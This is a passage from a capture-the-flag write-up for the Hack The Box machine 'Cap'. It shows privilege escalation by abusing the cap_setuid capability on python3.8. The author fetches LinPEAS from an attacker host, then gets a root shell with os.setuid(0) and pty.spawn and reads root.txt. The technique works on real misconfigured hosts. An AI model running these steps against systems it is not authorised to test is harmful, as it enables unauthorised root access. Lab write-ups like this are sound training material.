<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">nathan@cap:/var/www/html$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> app.py 
<span class="go">-rw-r--r-- 1 nathan nathan 4088 May 23 16:20 app.py
</span></code></pre></div></div>

<p>Or on Python:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">nathan@cap:/var/www/html$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /usr/bin/python3
<span class="go">lrwxrwxrwx 1 root root 9 Mar 13  2020 /usr/bin/python3 -&gt; python3.8
</span><span class="gp">nathan@cap:/var/www/html$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /usr/bin/python3.8
<span class="go">-rwxr-xr-x 1 root root 5486384 Jan 27 15:41 /usr/bin/python3.8
</span></code></pre></div></div>

<p>One way to give a program some privileges without having it completely get the power of root is to use <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">Linux capabilities</a>. <code class="language-plaintext highlighter-rouge">Python</code> has been assigned two:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">nathan@cap:/var/www/html$</span><span class="w"> </span>getcap /usr/bin/python3.8
<span class="go">/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
</span></code></pre></div></div>

<h4 id="linpeas">LinPEAS</h4>

<p>If I didn’t see the issues in the web code, a script like <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">LinPEAS</a> would also identify the capabilities. I’ll clone a copy of <a href="https://github.com/carlospolop/PEASS-ng">PEASS-ng</a> to my VM, and start a Python webserver in the directory with <code class="language-plaintext highlighter-rouge">linpeas.sh</code>:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">cd</span> /opt/PEASS-ng/linPEAS/
<span class="gp">oxdf@parrot$</span><span class="w"> </span>python3 <span class="nt">-m</span> http.server 80
<span class="go">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
</span></code></pre></div></div>

<p>I’ll request it with <code class="language-plaintext highlighter-rouge">wget</code>:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">nathan@cap:/tmp$</span><span class="w"> </span>wget 10.10.14.5/linpeas.sh                                                                                             
<span class="go">--2021-10-02 10:33:19--  http://10.10.14.5/linpeas.sh                                                                                   
Connecting to 10.10.14.5:80... connected.                                                                                               
HTTP request sent, awaiting response... 200 OK
Length: 470149 (459K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                        100%[=============================================================&gt;] 459.13K  1.79MB/s    in 0.3s    

2021-10-02 10:33:19 (1.79 MB/s) - ‘linpeas.sh’ saved [470149/470149]
</span></code></pre></div></div>

<p>And run it with <code class="language-plaintext highlighter-rouge">bash linpeas.sh</code>. The section on capabilities has <code class="language-plaintext highlighter-rouge">python3.8</code> highlighted to the max:</p>

<picture>
    <source type="image/webp" srcset="https://0xdfimages.gitlab.io/img/image-20211002063515904.webp" />
    <img loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20211002063515904.png" alt="image-20211002063515904" class="include_image " />
</picture>

<h3 id="shell">Shell</h3>

<h4 id="capabilities-background">Capabilities Background</h4>

<p>The man page describes <code class="language-plaintext highlighter-rouge">cap_net_bind_service</code> as:</p>

<blockquote>
  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Bind a socket to Internet domain privileged ports (port
numbers less than 1024).
</code></pre></div>  </div>
</blockquote>

<p>This is a really useful capability because it allows this one action without giving full root. In fact, I’ve set this capability on <code class="language-plaintext highlighter-rouge">python</code> on my VM so I don’t have to run <code class="language-plaintext highlighter-rouge">sudo</code> every time I want to start a Python webserver.</p>

<p>The man page describes <code class="language-plaintext highlighter-rouge">cap_setuid</code> as:</p>

<blockquote>
  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>* Make arbitrary manipulations of process UIDs (setuid(2),
setreuid(2), setresuid(2), setfsuid(2));
* forge UID when passing socket credentials via UNIX
domain sockets;
* write a user ID mapping in a user namespace (see
user_namespaces(7)).
</code></pre></div>  </div>
</blockquote>

<p><code class="language-plaintext highlighter-rouge">cap_seduid</code> has some good uses on binaries, but on something like Python which can take arbitrary user input, it is dangerous.</p>

<h4 id="abusing-capabilities">Abusing Capabilities</h4>

<p>I’ll abuse the <code class="language-plaintext highlighter-rouge">cap_setuid</code> to change the user id of the current process to something else, like I observed above. If this capabilities just applied to the webserver, there would be no issue. But I can also open a Python terminal:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">nathan@cap:/var/www/html$</span><span class="w"> </span>python3
<span class="go">Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
</span><span class="gp">&gt;&gt;&gt;</span><span class="w">
</span></code></pre></div></div>

<p>I can use a familiar line to get a shell:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="kn">import</span> <span class="n">pty</span>
<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">pty</span><span class="p">.</span><span class="nf">spawn</span><span class="p">(</span><span class="sh">"</span><span class="s">bash</span><span class="sh">"</span><span class="p">)</span>
<span class="gp">nathan@cap:/var/www/html$</span><span class="w"> </span><span class="nb">id</span>
<span class="go">uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
</span></code></pre></div></div>

<p>That’s as expected. I’ll exit:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">nathan@cap:/var/www/html$</span><span class="w"> </span><span class="nb">exit</span>
<span class="go">0
</span><span class="gp">&gt;&gt;&gt;</span><span class="w">
</span></code></pre></div></div>

<p>Back at the Python prompt, I’ll set the userid for this process to root:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="kn">import</span> <span class="n">os</span>
<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">os</span><span class="p">.</span><span class="nf">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>

<p>I can try to set the group id, but I don’t have that permission:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">os</span><span class="p">.</span><span class="nf">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="go">Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
PermissionError: [Errno 1] Operation not permitted
</span></code></pre></div></div>

<p>There is a <code class="language-plaintext highlighter-rouge">cap_setgid</code> capability as well that was not set here.</p>

<p>Now using <code class="language-plaintext highlighter-rouge">pty</code> to get a shell again gives a shell as the root user:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">pty</span><span class="p">.</span><span class="nf">spawn</span><span class="p">(</span><span class="sh">"</span><span class="s">bash</span><span class="sh">"</span><span class="p">)</span>
<span class="gp">root@cap:/var/www/html#</span><span class="w"> </span><span class="nb">id</span>
<span class="go">uid=0(root) gid=1001(nathan) groups=1001(nathan)
</span></code></pre></div></div>

<p>From there I can grab <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@cap:/var/www/html#</span><span class="w"> </span><span class="nb">cd</span> /root/
<span class="gp">root@cap:/root#</span><span class="w"> </span><span class="nb">cat </span>root.txt
<span class="go">f766c793************************
</span></code></pre></div></div>

      </div>
    </div>
  
  </div><a class="u-url" href="/2021/10/02/htb-cap.html" hidden></a>
</article>

      </div>
    </main>
<footer class="site-footer h-card">

  <div class="wrapper">

    <h2 data-toc-skip class="footer-heading">0xdf hacks stuff</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">0xdf hacks stuff
</li><li><a class="u-email" href="mailto:0xdf.223@gmail.com">0xdf.223@gmail.com</a></li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.twitter.com/0xdf_"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">0xdf_</span></a></li><!--<li><a href="https://mm.netsecfocus.com/nsf/messages/@oxdf"><img class="svg-icon" src="/assets/icons/mattermost-icon-128.png" alt="NSF" /><span class="username">oxdf</span></a></li>--><li><a href="https://youtube.com/channel/UChO9OAH57Flz35RRX__E25A"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#youtube"></use></svg> <span class="username">0xdf</span></a></li><li><a href="/feed.xml"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#rss"></use></svg> <span>feed</span></a></li><li class="bmc"><a href="https://app.hackthebox.com/users/profile/4935"><img class="svg-icon bmc" src="/assets/icons/htb-favicon.png" alt="HTB" /><span class="username">0xdf</span></a></li><li class="bmc"><a rel="me" href="https://infosec.exchange/@0xdf"><img class="svg-icon bmc" src="/assets/icons/mastodon.svg" alt="Mastodon" /><span class="username">@0xdf@infosec.exchange</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>CTF solutions, malware analysis, home lab development</p>
        <link href="https://fonts.googleapis.com/css?family=Cookie"
rel="stylesheet"><a class="bmc-button" target="_blank" href="https://www.buymeacoffee.com/0xdf"><img src="https://cdn.buymeacoffee.com/buttons/bmc-new-btn-logo.svg" alt="Buy me a coffee"><span style="margin-left:15px;font-size:28px !important;">Buy me a coffee</span></a>
      </div>
    </div>

  </div>


  <script src="/assets/js/jquery-3.6.0.min.js" integrity="sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK" crossorigin="anonymous"></script>
  <script src="/assets/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
  <script src="/assets/js/bootstrap-toc.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
  
  <script src="/assets/js/collapsable.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mermaid@10.6.1/dist/mermaid.min.js"></script>
<script>
  $(document).ready(function () {
    mermaid.initialize({
      startOnLoad:true,
      theme: "default",
    });
    window.mermaid.init(undefined, document.querySelectorAll('.language-mermaid'));
  });
</script>

  <script src="/assets/js/fix_mermaid.js"></script>


  <!-- Twitter universal website tag code -->
  <script>
    !function(e,t,n,s,u,a){e.twq||(s=e.twq=function(){s.exe?s.exe.apply(s,arguments):s.queue.push(arguments);
     },s.version='1.1',s.queue=[],u=t.createElement(n),u.async=!0,u.src='//static.ads-twitter.com/uwt.js',
     a=t.getElementsByTagName(n)[0],a.parentNode.insertBefore(u,a))}(window,document,'script');
    // Insert Twitter Pixel ID and Standard Event data below
    twq('init','o42o1');
    twq('track','PageView');
  </script>
  <!-- End Twitter universal website tag code -->
</footer>
</body>

</html>

